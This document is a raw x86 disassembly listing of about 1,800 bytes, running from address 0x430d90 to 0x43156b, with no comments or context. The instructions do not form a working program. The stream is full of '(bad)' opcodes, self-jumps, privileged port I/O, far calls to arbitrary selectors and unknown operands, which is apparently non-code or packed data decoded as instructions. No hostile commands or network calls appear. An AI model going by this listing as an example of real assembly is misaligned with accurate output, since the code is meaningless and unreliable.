  430d90:	sbb    dh,0x2b
  430d93:	xlat   BYTE PTR ds:[ebx]
  430d94:	enter  0xcf7e,0x92
  430d98:	pop    ebp
  430d99:	dec    esp
  430d9a:	shl    BYTE PTR [ebp-0x76559913],cl
  430da0:	push   ebp
  430da1:	pop    eax
  430da2:	fcom   QWORD PTR ds:0x44930b52
  430da8:	scas   eax,DWORD PTR es:[edi]
  430da9:	(bad)  
  430daa:	in     al,dx
  430dab:	xor    bh,BYTE PTR [edi]
  430dad:	ficom  WORD PTR [esi+0x39]
  430db0:	into   
  430db1:	hlt    
  430db2:	ret    
  430db3:	ffreep st(2)
  430db5:	fnstcw WORD PTR [ebx-0x7d]
  430db8:	enter  0x1351,0x95
  430dbc:	and    edx,DWORD PTR [ebx+0x35febf24]
  430dc2:	or     al,0xd3
  430dc4:	imul   ebp,DWORD PTR [edx],0xb692bd6f
  430dca:	jg     0x430dca
  430dcc:	adc    DWORD PTR [ebx],edx
  430dce:	das    
  430dcf:	jl     0x430de0
  430dd1:	cmp    DWORD PTR [ecx+0x4ca3f42a],0x62
  430dd8:	mov    eax,0x202bb786
  430ddd:	test   al,0x32
  430ddf:	inc    esi
  430de0:	cs xchg esi,eax
  430de2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430de3:	push   0xffffffac
  430de5:	shl    BYTE PTR [ebx-0x7],1
  430de8:	data16 xor cl,BYTE PTR [ebx]
  430deb:	jno    0x430d7e
  430ded:	adc    esp,DWORD PTR [ecx-0x12a17dcb]
  430df3:	jle    0x430e04
  430df5:	push   es
  430df6:	mov    edi,0xcef6deb3
  430dfb:	and    DWORD PTR [edx+edx*8-0x58],esi
  430dff:	in     eax,0xeb
  430e01:	cmp    edx,DWORD PTR [edi+0x51]
  430e04:	xor    dl,BYTE PTR [ebp-0x16]
  430e07:	jne    0x430e13
  430e09:	sub    WORD PTR [ebx],0xc5b9
  430e0e:	sub    DWORD PTR [ecx],esi
  430e10:	in     al,dx
  430e11:	inc    ecx
  430e12:	mov    dl,0x4b
  430e14:	and    eax,0x6c8b73a2
  430e19:	mov    edi,0x2abcc7f3
  430e1e:	lock pop esi
  430e20:	add    eax,0x7e0f06ea
  430e25:	mov    esp,DWORD PTR [edx-0x15]
  430e28:	aad    0xe4
  430e2a:	sahf   
  430e2b:	std    
  430e2c:	lods   eax,DWORD PTR ds:[esi]
  430e2e:	ja     0x430eaf
  430e30:	sbb    eax,0xb72e02f8
  430e36:	call   0x72fa23fb
  430e3b:	jo     0x430ea5
  430e3d:	mov    edx,0x34a3f5ce
  430e42:	mov    dh,BYTE PTR [edi-0x3b104e2c]
  430e48:	or     bl,BYTE PTR [ecx+0x2d]
  430e4b:	call   0xc349b48a
  430e50:	test   al,0x5a
  430e52:	pop    es
  430e53:	in     eax,0x98
  430e55:	push   ebp
  430e56:	jbe    0x430e07
  430e58:	or     dl,BYTE PTR [edx]
  430e5a:	stos   DWORD PTR es:[edi],eax
  430e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430e5c:	xor    ch,dh
  430e5e:	fimul  DWORD PTR [eax-0x54e28dab]
  430e64:	out    dx,al
  430e65:	or     DWORD PTR [edi+ebx*2+0x39],edx
  430e69:	je     0x430e36
  430e6b:	fild   WORD PTR [ebx+eiz*4+0x73]
  430e6f:	mov    edx,gs
  430e71:	mov    al,ds:0x4842b5d3
  430e76:	data16 jne 0x430e1a
  430e79:	jo     0x430e64
  430e7b:	aaa    
  430e7c:	push   eax
  430e7d:	nop
  430e7e:	push   edx
  430e7f:	xor    eax,0x8d2b49c
  430e84:	lods   al,BYTE PTR ds:[esi]
  430e85:	test   eax,0x1d36cc12
  430e8a:	and    DWORD PTR [eax+0x37835af1],ebp
  430e90:	outs   dx,BYTE PTR ds:[esi]
  430e91:	mov    ds:0xc25f5bfd,eax
  430e96:	jno    0x430ee1
  430e98:	pop    ss
  430e99:	repz jg 0x430e96
  430e9c:	sub    bl,dh
  430e9e:	mov    bh,0xff
  430ea0:	add    eax,ebx
  430ea2:	(bad)  
  430ea3:	std    
  430ea4:	mov    ebx,0x9a56fb08
  430ea9:	pop    es
  430eaa:	scas   eax,DWORD PTR es:[edi]
  430eab:	jmpw   0x7e6f
  430eaf:	dec    eax
  430eb0:	pop    esp
  430eb1:	cmp    dl,cl
  430eb3:	ret    0x7991
  430eb6:	cmp    al,0xab
  430eb8:	pushf  
  430eb9:	hlt    
  430eba:	mov    ebp,0xf48e0f6e
  430ebf:	jno    0x430e8d
  430ec1:	cmp    eax,0x985c9037
  430ec6:	(bad)
  430ec9:	sbb    eax,0xcc43eb36
  430ece:	pushf  
  430ecf:	dec    ebp
  430ed0:	xor    BYTE PTR ds:0xe9cf8f3e,dh
  430ed6:	aad    0xa
  430ed8:	test   BYTE PTR [ebx+ecx*1+0x34ed1d8a],0xb
  430ee0:	push   esp
  430ee1:	jg     0x430e70
  430ee3:	call   0x3ec761b7
  430ee8:	push   0x15
  430eea:	mov    edi,DWORD PTR [esi+0x29]
  430eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430eee:	repnz data16 loope 0x430f5c
  430ef2:	out    0xeb,eax
  430ef4:	jecxz  0x430e9a
  430ef6:	pop    edx
  430ef7:	pop    edx
  430ef8:	fisub  WORD PTR [ebx]
  430efa:	lahf   
  430efb:	mov    ch,0xb3
  430efd:	hlt    
  430efe:	jecxz  0x430f3f
  430f00:	xor    bh,bh
  430f02:	aad    0x5f
  430f04:	sub    al,0x27
  430f06:	dec    esi
  430f07:	aam    0x1b
  430f09:	pop    ecx
  430f0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430f0b:	push   cs
  430f0c:	or     DWORD PTR [ebp+0x6a8fd5a8],ebp
  430f12:	(bad)  
  430f13:	idiv   BYTE PTR [ebp-0x6c]
  430f16:	stc    
  430f17:	leave  
  430f18:	adc    ah,BYTE PTR [ecx-0x7c8c86e2]
  430f1e:	sbb    eax,0xfffffff0
  430f21:	stos   DWORD PTR es:[edi],eax
  430f22:	add    al,0x7b
  430f24:	fucomi st,st(1)
  430f26:	fstp   st(2)
  430f28:	inc    ecx
  430f29:	mov    dh,0x94
  430f2b:	and    dh,BYTE PTR [esi-0x24]
  430f2e:	es push 0x4f463b62
  430f34:	adc    esp,ebp
  430f36:	jmp    0x1976737e
  430f3b:	ins    BYTE PTR es:[edi],dx
  430f3c:	pop    esi
  430f3d:	das    
  430f3e:	mov    esi,0xe1d60ae6
  430f43:	and    DWORD PTR [edi+eiz*1-0x39],ecx
  430f47:	sub    dh,bl
  430f49:	fs (bad) 
  430f4b:	not    BYTE PTR [ebp+0x11]
  430f4e:	sbb    al,0xbb
  430f50:	push   esi
  430f51:	sbb    esi,DWORD PTR [eax-0x7042467d]
  430f57:	loope  0x430f47
  430f59:	test   al,0xb2
  430f5b:	jmp    0x93cd:0xd958514a
  430f62:	(bad)  
  430f63:	in     eax,dx
  430f64:	mov    ah,0xf
  430f66:	mov    ah,0x9
  430f68:	xchg   DWORD PTR [edx+eiz*4-0x6c],ebp
  430f6c:	mov    dh,0xd5
  430f6e:	mov    bl,0xe1
  430f70:	mov    ds:0x79052d11,al
  430f75:	imul   edi,DWORD PTR [ebp-0x65461c1],0xffffffed
  430f7c:	cwde   
  430f7d:	fwait
  430f7e:	cmp    ch,BYTE PTR [ecx-0x2d911982]
  430f84:	mov    edi,0xac64c03a
  430f89:	jno    0x430fa9
  430f8b:	sbb    al,0xd3
  430f8d:	mov    ebp,0x230ae4c3
  430f92:	mov    al,0x72
  430f94:	mov    dh,0xbd
  430f96:	xor    bh,BYTE PTR [esi+0x2b33fd36]
  430f9c:	mov    DWORD PTR [ebx+ebp*4+0x3bd56054],0xff62bbd0
  430fa7:	mov    dl,0x34
  430fa9:	xor    cl,ah
  430fab:	cmp    dh,ah
  430fad:	jnp    0x430f57
  430faf:	leave  
  430fb0:	enter  0xe82a,0xd4
  430fb4:	test   eax,0xe5a6aeff
  430fb9:	push   0x7f1bafb
  430fbe:	(bad)  [ecx-0x22]
  430fc1:	mov    ebp,0x30f4dc89
  430fc6:	scas   al,BYTE PTR es:[edi]
  430fc7:	(bad)  
  430fc8:	sub    ecx,ecx
  430fca:	daa    
  430fcb:	and    ebx,DWORD PTR [eax+0x6724624b]
  430fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430fd2:	inc    esp
  430fd3:	rcr    DWORD PTR [esp+edx*4],0x23
  430fd7:	imul   ecx,edx,0x8fa30afe
  430fdd:	lahf   
  430fde:	pop    ss
  430fdf:	add    ebp,DWORD PTR [edx+0x22]
  430fe2:	sbb    edx,DWORD PTR [edi]
  430fe4:	mov    ds:0x24d3c919,eax
  430fe9:	adc    al,0xe8
  430feb:	clc    
  430fec:	je     0x430f8c
  430fee:	stos   DWORD PTR es:[edi],eax
  430fef:	outs   dx,BYTE PTR ds:[esi]
  430ff0:	cmc    
  430ff1:	push   ecx
  430ff2:	int3   
  430ff3:	fadd   DWORD PTR ds:0x38983b3a
  430ff9:	sub    al,0xca
  430ffb:	aad    0xe3
  430ffd:	mov    ds:0x2cd58af9,eax
  431002:	dec    esi
  431003:	inc    ebp
  431004:	push   0xf508f16e
  431009:	adc    cl,BYTE PTR [edi-0xdf65394]
  43100f:	retf   
  431010:	popa   
  431011:	mov    bl,0x89
  431013:	popa   
  431014:	out    dx,eax
  431015:	ja     0x431048
  431017:	jp     0x431087
  431019:	xchg   ecx,eax
  43101a:	mov    ch,0x3b
  43101c:	cs and eax,0xaa2084fe
  431022:	fwait
  431023:	out    dx,eax
  431024:	pusha  
  431025:	out    0xb3,al
  431027:	lahf   
  431028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431029:	lock ror BYTE PTR [ebx-0x5002068b],1
  431030:	cs sub ebx,edi
  431033:	inc    BYTE PTR ds:[edi-0x5a]
  431037:	lahf   
  431038:	mov    edx,0x778ed09f
  43103d:	arpl   WORD PTR [eax-0xc2237ac],bp
  431043:	or     esp,DWORD PTR [esi+0x1e33fdee]
  431049:	xchg   DWORD PTR [ecx-0x35b0020a],eax
  43104f:	mov    ebx,DWORD PTR [ecx+0x59]
  431052:	cmp    al,0xf1
  431054:	xor    ebx,DWORD PTR [ecx+eiz*2]
  431057:	scas   eax,DWORD PTR es:[edi]
  431058:	sub    BYTE PTR [ebx-0x6e],ch
  43105b:	int3   
  43105c:	fs sbb al,0x67
  43105f:	xchg   ebx,eax
  431060:	mov    edi,eax
  431062:	je     0x4310c0
  431064:	and    BYTE PTR [ebx-0x78],bh
  431067:	int3   
  431068:	bound  edx,QWORD PTR [ebx+ebx*4]
  43106b:	fld    TBYTE PTR [esi]
  43106d:	call   DWORD PTR [esi-0x725147d9]
  431073:	dec    edx
  431074:	leave  
  431075:	inc    eax
  431076:	xor    DWORD PTR [ebp-0x3d6efbef],ebx
  43107c:	(bad)  
  43107e:	sub    cl,BYTE PTR [eax-0x53]
  431081:	or     eax,0xffffffe4
  431084:	adc    BYTE PTR [esi],dl
  431086:	push   edi
  431087:	sub    esp,DWORD PTR [esi-0x5371dd2e]
  43108d:	popf   
  43108e:	push   edx
  43108f:	push   edi
  431090:	(bad)  
  431091:	and    BYTE PTR [ecx+ebx*2],bl
  431094:	mov    ebp,0x2a429162
  431099:	dec    ebp
  43109a:	sti    
  43109b:	cli    
  43109c:	fstp   TBYTE PTR [ecx]
  43109e:	jmp    0xbe44:0x66aff6bb
  4310a5:	sub    ch,bh
  4310a7:	repnz (bad) 
  4310a9:	repz dec edi
  4310ab:	mov    DWORD PTR [ecx+0x5a310310],edx
  4310b1:	ret    0x8622
  4310b4:	ds stc 
  4310b6:	popf   
  4310b7:	inc    edi
  4310b8:	cmp    al,dh
  4310ba:	stos   DWORD PTR es:[edi],eax
  4310bb:	daa    
  4310bc:	xchg   esi,eax
  4310bd:	sub    edx,DWORD PTR [edi+0xd]
  4310c0:	cli    
  4310c1:	mov    esi,0x6d3f63a9
  4310c6:	dec    edi
  4310c7:	dec    edi
  4310c8:	shr    DWORD PTR [eax],cl
  4310ca:	bound  edx,QWORD PTR [ebx-0x4d]
  4310cd:	push   ds
  4310ce:	stos   BYTE PTR es:[edi],al
  4310cf:	cld    
  4310d0:	jne    0x43110e
  4310d2:	inc    eax
  4310d3:	jns    0x4310d4
  4310d5:	stos   BYTE PTR es:[edi],al
  4310d6:	scas   al,BYTE PTR es:[edi]
  4310d7:	mov    ds:0xb557fd2a,eax
  4310dc:	jbe    0x4310a9
  4310de:	sub    BYTE PTR [eax+eiz*4],al
  4310e1:	cli    
  4310e2:	ret    
  4310e3:	sub    ecx,edi
  4310e5:	pop    edi
  4310e6:	pop    ecx
  4310e7:	and    DWORD PTR [edx+ebp*4],eax
  4310ea:	jae    0x431078
  4310ec:	retf   0x52fa
  4310ef:	dec    ebp
  4310f0:	and    BYTE PTR [edi+eiz*4-0x6b],dl
  4310f4:	or     cl,BYTE PTR [ebp-0x753d3e36]
  4310fa:	iret   
  4310fb:	inc    ecx
  4310fc:	arpl   sp,cx
  4310fe:	cmp    BYTE PTR [esi+eiz*2],dh
  431101:	shl    BYTE PTR [ebp-0x30],1
  431104:	call   0xaefdbbbf
  431109:	lods   al,BYTE PTR ds:[esi]
  43110a:	fbstp  TBYTE PTR [ebx-0xc0aa67]
  431110:	xor    esi,esp
  431112:	inc    BYTE PTR [edx+0x171b6cbc]
  431118:	jle    0x431113
  43111a:	pop    ecx
  43111b:	xor    bh,BYTE PTR [esi+0x1b7d0236]
  431121:	test   DWORD PTR [edi+0x6d],esi
  431124:	out    0xc4,al
  431126:	jg     0x4311a4
  431128:	pushf  
  431129:	call   0xb7f8af72
  43112e:	xor    al,0xc9
  431130:	xchg   ah,dh
  431132:	nop
  431133:	cmp    al,0x77
  431135:	mov    ?,WORD PTR [esi-0x7c1eb993]
  43113b:	pop    ebp
  43113c:	cmp    BYTE PTR [edi-0x12],dh
  43113f:	data16 icebp 
  431141:	fsub   st,st(3)
  431143:	cmc    
  431144:	mov    ds:0x53259b17,eax
  431149:	outs   dx,DWORD PTR ds:[esi]
  43114a:	mov    edi,0xf058f4ec
  43114f:	jbe    0x4311ac
  431151:	sub    DWORD PTR [eax+0x36b6b4b2],ebx
  431157:	adc    ebx,edi
  431159:	ret    
  43115a:	dec    ebx
  43115b:	push   esp
  43115c:	and    BYTE PTR [esi],0xd2
  43115f:	imul   esp,DWORD PTR [ebx],0x31bbdd9e
  431165:	sbb    BYTE PTR [ebp-0x6c],ch
  431168:	retf   
  431169:	fnstcw WORD PTR [edx]
  43116b:	add    dh,BYTE PTR [eax]
  43116d:	call   0xdb18:0xa78614dc
  431174:	stc    
  431175:	mov    bh,0xcb
  431177:	and    eax,ecx
  431179:	mov    ah,0xf7
  43117b:	push   ds
  43117c:	pop    esp
  43117d:	js     0x43110b
  43117f:	stos   BYTE PTR es:[edi],al
  431180:	ss jbe 0x4311cb
  431183:	and    BYTE PTR [edi+0x6a],bl
  431186:	jmp    0x1931:0x382d899f
  43118d:	jecxz  0x4311b3
  43118f:	push   ss
  431190:	mov    dl,0xe4
  431192:	xchg   esi,eax
  431193:	into   
  431194:	push   eax
  431195:	dec    eax
  431196:	mov    bh,0x72
  431198:	aad    0x17
  43119a:	scas   al,BYTE PTR es:[edi]
  43119b:	es repnz in al,dx
  43119e:	or     BYTE PTR [ebx+0x5e0847e7],dh
  4311a4:	stc    
  4311a5:	fsubr  QWORD PTR ss:[esi-0x3a548774]
  4311ac:	jp     0x431205
  4311ae:	fs xchg ebx,ebx
  4311b1:	cmp    DWORD PTR [edi-0x1b2eca9d],0x1dcf54b3
  4311bb:	pop    ss
  4311bc:	and    DWORD PTR [esi+0x20],0x73
  4311c0:	pop    esi
  4311c1:	out    dx,al
  4311c2:	mov    al,0xfd
  4311c4:	arpl   WORD PTR [esi+eax*2-0x61],dx
  4311c8:	pusha  
  4311c9:	imul   esi,DWORD PTR [esi-0x6e],0x4d9962ea
  4311d0:	push   edi
  4311d1:	adc    al,0x98
  4311d3:	aad    0x8a
  4311d5:	leave  
  4311d6:	bound  esi,QWORD PTR [esi-0x4f]
  4311d9:	cld    
  4311da:	pop    esi
  4311db:	rcl    BYTE PTR [ebp-0x35b8e992],cl
  4311e1:	hlt    
  4311e2:	pop    edi
  4311e3:	ds enter 0xd0d8,0x8
  4311e8:	std    
  4311e9:	xlat   BYTE PTR ds:[ebx]
  4311ea:	pop    esi
  4311eb:	inc    ecx
  4311ec:	and    dl,BYTE PTR [ecx]
  4311ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4311ef:	jg     0x4311c6
  4311f1:	inc    edi
  4311f2:	dec    ecx
  4311f3:	pop    edx
  4311f4:	sub    al,0x42
  4311f6:	aaa    
  4311f7:	cs pusha 
  4311f9:	xor    DWORD PTR [ebp+eax*4-0x4e33a68f],edi
  431200:	loop   0x4311c7
  431202:	push   0x5c1a05f0
  431207:	pop    edi
  431208:	gs js  0x43124c
  43120b:	jecxz  0x4311e9
  43120d:	jle    0x431274
  43120f:	stos   BYTE PTR es:[edi],al
  431210:	scas   eax,DWORD PTR es:[edi]
  431211:	sub    dl,BYTE PTR [edi]
  431213:	push   esi
  431214:	mov    esp,0x5d8a7558
  431219:	jns    0x43121d
  43121b:	mov    al,ds:0xba33828e
  431220:	mov    cl,0x56
  431222:	mov    ecx,0xdffa8b04
  431227:	test   eax,0xd131e13
  43122c:	inc    esp
  43122d:	xlat   BYTE PTR ds:[ebx]
  43122e:	mov    ds:0x7f2d741b,al
  431233:	fs loopne 0x4311ef
  431236:	fwait
  431237:	mov    cl,0xc
  431239:	mul    BYTE PTR [edx+0xe]
  43123c:	jg     0x43123a
  43123e:	mov    ds:0xf723933,al
  431243:	mov    ch,0x44
  431245:	inc    esi
  431246:	cmp    al,0x64
  431248:	push   cs
  431249:	mov    bl,0x70
  43124b:	cmc    
  43124c:	aam    0xa1
  43124e:	and    DWORD PTR [edx-0x37],esp
  431251:	xor    al,0xf1
  431253:	inc    ebp
  431254:	icebp  
  431255:	mov    dh,0xed
  431257:	push   esi
  431258:	and    esp,0x6a676266
  43125e:	int3   
  43125f:	popf   
  431260:	into   
  431261:	jo     0x431261
  431263:	push   eax
  431264:	xchg   esp,eax
  431265:	(bad)  [edi+0x595c8bb7]
  43126b:	test   BYTE PTR [edi+0x5188a81b],ch
  431271:	popf   
  431272:	push   ds
  431273:	sub    dl,BYTE PTR [edx]
  431275:	mov    esp,0xd6462fce
  43127a:	test   edi,eax
  43127c:	in     eax,dx
  43127d:	adc    ah,ch
  43127f:	sub    ah,bl
  431281:	outs   dx,BYTE PTR ds:[esi]
  431282:	mov    bh,0x93
  431284:	dec    edi
  431285:	mov    esp,DWORD PTR [edx]
  431287:	pop    ds
  431288:	cdq    
  431289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43128a:	repz push ss
  43128c:	xor    DWORD PTR [esi-0x7e1efc97],eax
  431292:	frstor [esi+ecx*1+0x5c]
  431296:	shr    BYTE PTR [ecx-0x26],0xca
  43129a:	shl    BYTE PTR [edi+0x7f],cl
  43129d:	dec    ebx
  43129e:	out    dx,al
  43129f:	shr    cl,0xfa
  4312a2:	sti    
  4312a3:	int3   
  4312a4:	jle    0x4312a4
  4312a6:	jbe    0x431256
  4312a8:	cld    
  4312a9:	cld    
  4312aa:	fwait
  4312ab:	cdq    
  4312ac:	fdivp  st(3),st
  4312ae:	xor    al,0xc1
  4312b0:	or     eax,0xf530e3d7
  4312b5:	adc    cl,bh
  4312b7:	rol    BYTE PTR [edi],0xc9
  4312ba:	push   ds
  4312bb:	pop    ds
  4312bc:	(bad)  
  4312bd:	jb     0x43132a
  4312bf:	pop    ds
  4312c0:	ins    DWORD PTR es:[edi],dx
  4312c1:	aas    
  4312c2:	cld    
  4312c3:	mov    ch,0xd0
  4312c5:	mov    edx,0x3d9d4897
  4312ca:	inc    esp
  4312cb:	jmp    0x431322
  4312cd:	fistp  DWORD PTR [eax+0x165c7fda]
  4312d3:	(bad)  
  4312d4:	mov    ch,al
  4312d6:	imul   esp,DWORD PTR [esi],0xc824bd31
  4312dc:	and    al,0x48
  4312de:	xor    DWORD PTR [edi],esp
  4312e0:	push   cs
  4312e1:	(bad)
  4312e4:	xor    bh,BYTE PTR [edx]
  4312e6:	(bad)  
  4312e7:	shr    edi,cl
  4312e9:	adc    ah,BYTE PTR [edx+eiz*8]
  4312ec:	and    bh,BYTE PTR [edx]
  4312ee:	xchg   ebx,eax
  4312ef:	push   ss
  4312f0:	xor    al,0x69
  4312f2:	mov    ds:0x350acd98,eax
  4312f7:	fldcw  WORD PTR [edx]
  4312f9:	sub    BYTE PTR [esi+0x3b],cl
  4312fc:	xchg   esi,eax
  4312fd:	int3   
  4312fe:	arpl   sp,si
  431300:	cmp    dh,BYTE PTR [ecx-0x7b]
  431303:	pop    es
  431304:	pop    eax
  431305:	call   0x165a:0xbfc7893c
  43130c:	mov    bl,0x46
  43130e:	mov    al,ds:0xb6cc12f5
  431313:	es push cs
  431315:	cwde   
  431316:	mov    dh,0x2c
  431318:	pop    ss
  431319:	jmp    0xefa7:0x1d8ffea8
  431320:	and    edi,DWORD PTR [eax-0x2f57d026]
  431326:	dec    esp
  431327:	icebp  
  431328:	mov    DWORD PTR [edi-0x6e0827],esp
  43132e:	retf   
  43132f:	pop    eax
  431330:	lods   eax,DWORD PTR ds:[esi]
  431331:	push   esi
  431332:	push   edi
  431333:	clc    
  431334:	inc    ebp
  431335:	pop    ebp
  431336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431337:	push   ss
  431338:	push   0xe3ab5e94
  43133d:	pop    ebx
  43133e:	mov    ch,0xd7
  431340:	into   
  431341:	adc    eax,0x9ee8a8ba
  431346:	cli    
  431347:	pop    ecx
  431348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431349:	aas    
  43134a:	stos   DWORD PTR es:[edi],eax
  43134b:	dec    esp
  43134c:	push   eax
  43134d:	xor    eax,0x50b97c16
  431352:	lods   al,BYTE PTR ds:[esi]
  431353:	dec    ebp
  431354:	inc    edi
  431355:	add    dl,ch
  431357:	cmp    al,0x58
  431359:	mov    ch,0x8b
  43135b:	push   edx
  43135c:	sbb    eax,0x27ba7370
  431361:	or     dl,ch
  431363:	mov    ch,BYTE PTR [edi-0x2c35bafe]
  431369:	inc    ebx
  43136a:	arpl   dx,di
  43136c:	lods   al,BYTE PTR ds:[esi]
  43136d:	push   0x22
  43136f:	mov    eax,ds:0x7159ca72
  431374:	dec    ebp
  431375:	adc    eax,0xafca523c
  43137a:	retf   0xb52f
  43137d:	fbstp  TBYTE PTR [ebp+0x313af1a8]
  431383:	add    ch,BYTE PTR [ebx-0x61]
  431386:	std    
  431387:	ud1    esi,DWORD PTR [edi-0x30ac34a8]
  43138e:	bound  ebx,QWORD PTR [esi-0x4b]
  431391:	xchg   eax,ecx
  431393:	test   DWORD PTR [edi-0x68],edx
  431396:	sbb    eax,0xf0b2c61d
  43139b:	sub    al,0x93
  43139d:	inc    edi
  43139e:	bnd ret 0xe4bb
  4313a2:	push   0xffffffc6
  4313a4:	cs sbb al,0xae
  4313a7:	inc    ebp
  4313a8:	int3   
  4313a9:	addr16 push ss
  4313ab:	push   0xf9156cbf
  4313b0:	jmp    0x4313f0
  4313b2:	inc    eax
  4313b3:	ins    DWORD PTR es:[edi],dx
  4313b4:	icebp  
  4313b5:	add    al,0x6
  4313b7:	imul   esp,DWORD PTR [edx+0x1918215e],0xffffff89
  4313be:	loopne 0x4313b0
  4313c0:	mov    ebx,0xa2f2bb31
  4313c5:	cwde   
  4313c6:	adc    eax,DWORD PTR [esi+eax*1-0x583a5706]
  4313cd:	dec    ecx
  4313ce:	imul   ebx,DWORD PTR [ebx-0x261e0c6d],0x188226d0
  4313d8:	(bad)  
  4313d9:	outs   dx,WORD PTR ds:[esi]
  4313db:	(bad)  
  4313dc:	in     eax,dx
  4313dd:	stc    
  4313de:	adc    BYTE PTR [ebp-0x51957ba6],dh
  4313e4:	rcl    BYTE PTR [eax-0x5],0x5b
  4313e8:	xchg   esi,eax
  4313e9:	mov    ebp,0xb6d5f69a
  4313ee:	mov    ch,0x7
  4313f0:	fbstp  TBYTE PTR [ebx-0x9]
  4313f3:	pusha  
  4313f4:	mov    cl,0x85
  4313f6:	xor    al,0x3
  4313f8:	cs jo  0x4313f8
  4313fb:	sbb    esp,DWORD PTR [edx+0x58]
  4313fe:	xor    al,dl
  431400:	push   ecx
  431401:	xor    eax,0xc984ba18
  431406:	mov    bl,0x15
  431408:	mov    ebx,0x4c7c42c3
  43140d:	mov    esp,0xd98c207c
  431412:	push   edx
  431413:	and    eax,0x151af63f
  431418:	mov    ebx,DWORD PTR [ebx-0x18]
  43141b:	mov    eax,DWORD PTR [ebx]
  43141d:	dec    ebx
  43141e:	fadd   st(3),st
  431421:	jecxz  0x43148a
  431423:	jmp    0x3cfc0820
  431428:	arpl   sp,dx
  43142a:	es dec edx
  43142c:	fcomp  st(2)
  43142e:	fild   WORD PTR [ecx+esi*4-0xc3a6251]
  431435:	psrad  mm5,mm3
  431438:	pop    esi
  431439:	sub    ebx,esi
  43143b:	and    ah,BYTE PTR [eax]
  43143d:	sbb    al,0x31
  43143f:	mov    edx,0x653cd698
  431445:	push   cs
  431446:	mov    bl,0xd7
  431448:	inc    esi
  431449:	(bad)  [eax+0x11519278]
  43144f:	mov    al,0xbe
  431451:	outs   dx,BYTE PTR ds:[esi]
  431452:	mov    edi,ds
  431454:	jle    0x4313f0
  431456:	cld    
  431457:	aas    
  431458:	pop    esi
  431459:	dec    ebp
  43145a:	sub    dl,BYTE PTR [ebx]
  43145c:	shl    BYTE PTR [si-0x362],0xcb
  431462:	daa    
  431463:	sub    BYTE PTR [esi-0x14],bh
  431466:	retf   
  431467:	test   BYTE PTR ds:0x7ca27357,bl
  43146d:	xor    DWORD PTR ds:0x51ce5354,ecx
  431473:	sbb    bl,ah
  431475:	push   eax
  431476:	repz fcom DWORD PTR [ebx]
  431479:	mov    edx,0x18a1aa52
  43147e:	mov    bl,BYTE PTR [ebx]
  431480:	stos   BYTE PTR es:[edi],al
  431481:	mov    cl,0xd0
  431483:	sub    ch,dl
  431485:	outs   dx,DWORD PTR ds:[esi]
  431486:	mov    ds:0x3553e0d1,eax
  43148b:	sbb    BYTE PTR [ebp-0x57],dl
  43148e:	ror    DWORD PTR [esi+0x3ca70215],0x8d
  431495:	call   0x9f6b:0x8ddaa3aa
  43149c:	push   ebx
  43149d:	mov    ch,0xf4
  43149f:	pop    ebp
  4314a0:	cli    
  4314a1:	ds xchg dh,dl
  4314a4:	mov    eax,0x1362fe09
  4314a9:	(bad)  
  4314aa:	stos   DWORD PTR es:[edi],eax
  4314ab:	inc    BYTE PTR [ebx-0x52]
  4314ae:	sbb    DWORD PTR [ebx-0x39d709c4],esp
  4314b4:	push   esp
  4314b5:	xchg   edx,eax
  4314b6:	fdiv   st(6),st
  4314b8:	adc    DWORD PTR [ecx+0x12f97e7a],esp
  4314be:	outs   dx,DWORD PTR ds:[esi]
  4314bf:	std    
  4314c0:	retf   
  4314c1:	push   edi
  4314c2:	sub    BYTE PTR [ebx],bh
  4314c4:	test   dh,bl
  4314c6:	mov    eax,0x4e3d98ab
  4314cb:	ins    BYTE PTR es:[edi],dx
  4314cc:	sub    eax,0xa600bad6
  4314d1:	stos   WORD PTR es:[edi],ax
  4314d3:	mov    WORD PTR [esi],?
  4314d5:	lahf   
  4314d6:	shr    BYTE PTR [edx-0x78],0xb2
  4314da:	in     eax,0x9d
  4314dc:	and    BYTE PTR [esi-0x7099e154],0x8a
  4314e3:	inc    edi
  4314e4:	mov    edi,0xc8ccc9c6
  4314e9:	jns    0x43152d
  4314eb:	imul   ebp,DWORD PTR [edi],0x23
  4314ee:	jb     0x431524
  4314f0:	(bad)  
  4314f1:	jecxz  0x431497
  4314f3:	and    BYTE PTR [edx-0x39dbc2e5],bh
  4314f9:	dec    edx
  4314fa:	adc    al,0x4e
  4314fc:	das    
  4314fd:	sar    BYTE PTR [edx+0x6b],1
  431500:	and    ebx,0xfd59477b
  431506:	mov    dh,0x4f
  431508:	loopne 0x431517
  43150a:	scas   eax,DWORD PTR es:[edi]
  43150b:	mov    ds:0xccc23074,eax
  431510:	fistp  QWORD PTR [esi+0x5f]
  431513:	pop    eax
  431514:	shl    DWORD PTR [edx],cl
  431516:	sti    
  431517:	fbstp  TBYTE PTR [ebp+edx*4+0x47e4fd77]
  43151e:	adc    al,0x27
  431520:	push   ds
  431521:	(bad)  
  431522:	loop   0x431593
  431524:	push   ss
  431525:	cli    
  431526:	js     0x4314e1
  431528:	enter  0x5d7,0x26
  43152c:	out    dx,eax
  43152d:	cld    
  43152e:	and    BYTE PTR [esi],cl
  431530:	push   ecx
  431531:	dec    esp
  431532:	sti    
  431533:	out    dx,eax
  431534:	out    dx,al
  431535:	(bad)  
  431536:	xor    eax,0xf9c51d78
  43153b:	xchg   edi,eax
  43153c:	leave  
  43153d:	or     esi,DWORD PTR ds:0xa44c3a29
  431543:	mov    cs,edi
  431545:	loope  0x431554
  431547:	xor    eax,0x32f7678b
  43154c:	cmc    
  43154d:	repnz mov BYTE PTR [eax-0xc],bh
  431551:	cmp    al,0xee
  431553:	jne    0x431537
  431555:	ins    BYTE PTR es:[edi],dx
  431556:	pop    edx
  431557:	jl     0x43159d
  431559:	iret   
  43155a:	dec    edi
  43155b:	or     ebx,ebp
  43155d:	adc    esp,esp
  43155f:	and    DWORD PTR [edx+0x7078095e],edx
  431565:	xchg   DWORD PTR [ebx+0x239d4f49],edi
  43156b:	shl    BYTE PTR [ebx+0x26921c4d],1
